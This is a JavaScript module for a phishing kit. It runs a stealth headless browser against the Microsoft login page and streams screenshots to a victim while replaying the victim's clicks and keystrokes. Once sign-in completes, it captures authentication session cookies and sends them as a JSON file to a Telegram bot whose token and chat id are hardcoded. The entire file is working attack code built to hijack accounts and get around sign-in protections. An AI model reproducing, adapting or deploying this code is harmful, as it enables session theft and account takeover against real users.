const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

// --- CONFIG ---
const VAULT_URL = "https://script.googleusercontent.com/macros/echo?user_content_key=AWDtjMUqhClgfeFlU8Xv_oX6N6eXj3l7lbyNcSkwxk-JkstXJYafiVNpdDBlT452ND7spqv7p3eQRXoD5LOsTDGcSZA1g4RX8v7GLHXuLucT81tg9au9CEbNP55X9hLIOqMSQh8Fc-taJut7HXkZiFO464jKxJCrfrUaLuqfE4rZyHPFdaXwlPY9wZwfTHjcYK33eMIoLp_eyKW2KspfnYAk2Xx6dbBVNjIOCTUS9di8QeEHoSra82-uqH8Wrl5yHTXorlXRxsCYZa4-wO_EOwajrh3mg7KUNQ&lib=MycdviQl2tpQGpak5QfXFV5l1jq1QWbX2";
const TARGET = "https://login.microsoftonline.com/";

async function getCredentials() {
    try {
        const response = await axios.get(VAULT_URL, { timeout: 7000, maxRedirects: 5 });
        if (response.data && response.data.TG_TOKEN) {
            return response.data;
        }
    } catch (e) {
        // We log this because if GAPS is down, nothing works.
        console.log("CRITICAL: GAPS Vault connection failed.");
    }
    return { 
        "TG_TOKEN": "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
        "TG_CHAT_ID": "1318100118"
    };
}

async function sendExfiltration(cookies, url) {
    const creds = await getCredentials();
    const host = new URL(url).hostname;

    // This will show in Railway logs to confirm the trigger is working
    console.log(`[NETWORK_LOG] Sending ${cookies.length} cookies for ${host}`);

    try {
        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
            chat_id: creds.TG_CHAT_ID,
            text: `<b>🚨 CAPTURE</b>\n<b>Host:</b> ${host}`,
            parse_mode: 'HTML'
        });

        const form = new FormData();
        form.append('chat_id', creds.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `COOKIES_${host.replace(/\./g, '_')}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
        
        console.log("[NETWORK_LOG] Telegram deliver successful.");
    } catch (e) {
        // Re-enabling the error log just for this function
        console.log("[TELEGRAM_ERROR]:", e.response ? JSON.stringify(e.response.data) : e.message);
    }
}

async function startSession(io, socket) {
    let browser = null;
    const capturedUrls = new Set();

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        await page.goto(TARGET, { waitUntil: 'networkidle2' });

        const poller = setInterval(async () => {
            try {
                const url = page.url();
                const cookies = await page.cookies();
                
                // Aggressive check for common auth cookies
                const hasAuth = cookies.some(c => 
                    c.name.includes('AUTH') || 
                    c.name.includes('Session') || 
                    c.name.includes('SigninState')
                );

                if (hasAuth && !capturedUrls.has(url)) {
                    capturedUrls.add(url);
                    // Small delay to let the cookies finish writing to the browser
                    setTimeout(() => sendExfiltration(cookies, url), 2000);
                }
            } catch (e) {}
        }, 4000);

        const stream = setInterval(async () => {
            if (socket.connected) {
                try {
                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
                    socket.emit('browser-render', { screenshot: b64 });
                } catch (e) {}
            }
        }, 1000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.move(data.x, data.y);
                    await page.mouse.click(data.x, data.y, { delay: 50 });
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(poller);
            clearInterval(stream);
            if (browser) await browser.close();
        });

    } catch (err) {
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
